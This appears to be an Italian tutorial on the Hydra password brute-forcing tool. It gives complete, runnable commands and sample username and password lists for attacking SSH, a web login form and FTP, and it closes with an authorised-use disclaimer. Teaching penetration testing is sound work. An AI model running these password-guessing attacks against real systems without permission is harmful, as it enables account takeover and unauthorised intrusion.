# Cos'é Hydra?
Hydra è un potente strumento open source utilizzato per testare la sicurezza di sistemi di autenticazione attraverso attacchi di forza bruta. È in grado di attaccare una vasta gamma di protocolli di rete e servizi, tra cui HTTP, FTP, SSH, Telnet, ecc.

## Come funziona?
Hydra effettua attacchi di forza bruta su diversi servizi cercando di autenticarsi con varie combinazioni di nomi utente e password. Utilizza una lista di nomi utente e password comuni per tentare di indovinare le credenziali corrette.

## Esempi pratici

**Attacco SSH**

Cerchiamo di attaccare un server SSH con indirizzo IP '192.168.1.100'.
Creiamo due file: nomi utente(username.txt) e password(passwords.txt)
Username contiene i seguenti dati:
```
admin
user
test
```
Password contiene i seguenti dati:
```
123456
password
admin
```
Eseguiamo Hydra con i seguenti comandi:

```hydra -L usernames.txt -P passwords.txt ssh://192.168.1.100```
- -L usernames.txt: Specifica il file contenente i nomi utente.
- -P passwords.txt: Specifica il file contenente le password.
- ssh://192.168.1.100: Indica il servizio (SSH) e l'indirizzo IP del server da attaccare.

**Attacco HTTP POST su Login Page**

Cerchiamo di attaccare una pagina di login web con il seguente url 'http://example.com/login'
Creiamo due file: nomi utente(username.txt) e password(passwords.txt)
Username contiene i seguenti dati:
```
admin
user
test
```
Password contiene i seguenti dati:
```
123456
password
admin
```
Eseguiamo Hydra con i seguenti comandi:

```hydra -L usernames.txt -P passwords.txt http-post-form \ "http://example.com/login:username=^USER^&password=^PASS^:F=incorrect"```
- http-post-form: Specifica il tipo di attacco (form HTTP POST).
- http://example.com/login: URL della pagina di login.
- username=^USER^&password=^PASS^: Modello per i parametri POST (Hydra sostituirà ^USER^ e ^PASS^ con i valori dei file).
- :F=incorrect: Stringa di fallimento (il testo che appare nella pagina quando la login fallisce).

**Attacco FTP con Singola Password**

Cerchiamo di attaccare un server FTP con IP '192.168.1.101' con una password comune (password123) per un elenco di nomi utente.
Creiamo un file di testo contenente i nomi utente(username.txt):
```
admin
user
test
```
Eseguiamo Hydra con i seguenti comandi:

```hydra -L usernames.txt -p password123 ftp://192.168.1.101```
- -L usernames.txt: Specifica il file contenente i nomi utente.
- -p password123: Specifica una singola password da provare.
- ftp://192.168.1.101: Indica il servizio (FTP) e l'indirizzo IP del server da attaccare.

# Disclaimer

L'uso di Hydra deve essere limitato a scopi legittimi e legali. Utilizzare Hydra per accedere a sistemi senza autorizzazione è illegale. È importante utilizzare questo strumento solo per testare la sicurezza dei propri sistemi o con il permesso esplicito del proprietario del sistema.
